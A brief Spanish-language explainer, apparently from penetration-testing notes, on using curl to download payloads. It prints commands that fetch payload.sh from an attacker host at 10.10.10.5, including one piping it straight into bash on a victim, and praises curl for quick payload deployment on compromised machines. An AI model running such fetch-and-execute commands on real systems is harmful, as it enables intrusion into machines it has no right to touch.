¿Qué es curl?

curl es una utilidad de línea de comandos para transferir datos desde o hacia un servidor usando protocolos como HTTP, HTTPS, FTP, etc.
En este contexto, se usa para descargar o enviar un payload directamente desde la terminal, por ejemplo:

# Descargar un script desde un servidor y guardarlo
curl http://10.10.10.5/payload.sh -o payload.sh

# Descargar y ejecutar en el momento (si la víctima lo permite)
curl http://10.10.10.5/payload.sh | bash

Ventajas:

    Evita abrir manualmente un navegador.

    Permite integración en un solo comando para ejecución remota.

    Útil para despliegue rápido de payloads en máquinas comprometidas.